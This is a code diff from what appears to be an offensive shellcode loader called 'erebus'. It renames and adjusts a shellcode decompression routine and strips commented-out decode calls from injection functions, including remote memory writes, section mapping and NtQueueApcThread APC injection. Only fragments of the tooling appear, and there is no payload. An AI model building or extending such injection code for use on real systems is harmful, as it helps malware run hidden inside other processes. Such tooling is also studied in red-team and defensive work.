@@ -492,22 +492,24 @@ BOOL AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE*
 	// DECOMPRESSION ROUTINE
 	// ============================================================
 	
-	VOID DecompressShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
+	VOID AutoDetectAndDecompress(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
 	{
 		LOG_INFO("========================================");
 		LOG_INFO("Shellcode Decompression (CONFIG-based)");
 		LOG_INFO("========================================");
 
-		switch (CONFIG_COMPRESSION_TYPE)
+		int current_config = (int)CONFIG_COMPRESSION_TYPE;
+
+		switch (current_config)
 		{
-		case FORMAT_LZNT1:
+		case int(FORMAT_LZNT1):
 		{
 			LOG_SUCCESS("Decompressing with LZNT1");
 			DecompressionLZNT(Shellcode, ShellcodeLen);
 			LOG_SUCCESS("Decompression complete: %zu bytes", *ShellcodeLen);
 			break;
 		}
-		case FORMAT_RLE:
+		case int(FORMAT_RLE):
 		{
 			LOG_SUCCESS("Decompressing with RLE");
 			DecompressionRLE(Shellcode, ShellcodeLen);
@@ -582,10 +584,6 @@ BOOL AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE*
 	{
 		BYTE* pFinalShellcode = shellcode;
 		SIZE_T sFinalSize = shellcode_size;
-
-		// 1. Decompress/Decode
-		//erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
-
 		SIZE_T bytes_written = 0;
 		PVOID base_address = NULL;
 		SIZE_T allocation_size = sFinalSize;
@@ -626,9 +624,6 @@ BOOL AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE*
 	{
 		BYTE* pFinalShellcode = shellcode;
 		SIZE_T sFinalSize = shellcode_size;
-
-		//erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
-
 		HANDLE section_handle;
 		LARGE_INTEGER section_size = { 0 };
 		section_size.QuadPart = sFinalSize;
@@ -675,7 +670,6 @@ BOOL AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE*
 
 	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
 	{
-		// WriteShellcodeInMemory calls AutoDetect internally now
 		PVOID base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
 		
 		if (base_address) {
